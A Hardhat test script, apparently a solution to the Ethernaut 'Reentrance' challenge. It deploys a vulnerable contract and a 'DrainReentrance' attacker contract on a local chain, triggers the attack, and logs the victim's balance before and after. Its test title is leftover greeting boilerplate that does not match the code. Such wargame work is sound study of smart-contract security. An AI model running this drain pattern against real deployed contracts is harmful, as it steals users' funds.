const {expect} = require('chai');
const {ethers, waffle} = require('hardhat');

describe('Reentrance', function () {
	it("Should return the new greeting once it's changed", async function () {
		const [owner, knower] = await ethers.getSigners();
		// console.log('owner', owner);

		const Reentrance = await ethers.getContractFactory('Reentrance');
		const reentrance = await Reentrance.deploy();
		await reentrance.deployed();

		await knower.sendTransaction({
			to: reentrance.address,
			value: ethers.utils.parseEther('0.001'),
		});

		let ethBal = await waffle.provider.getBalance(reentrance.address);
		console.log('ethBal', ethBal);

		const DrainReentrance = await ethers.getContractFactory('DrainReentrance');
		const dr = await DrainReentrance.deploy(reentrance.address);
		await dr.deployed();

		await (
			await dr.donateToReentrance({
				value: '1000000000000000',
				// gasLimit: 1000000,
			})
		).wait();

		console.log('balanceOfDR', await reentrance.balanceOf(dr.address));

		await (await dr.attack('1000000000000000')).wait();

		ethBal = await waffle.provider.getBalance(reentrance.address);
		console.log('ethBalAfter', ethBal);
	});
});
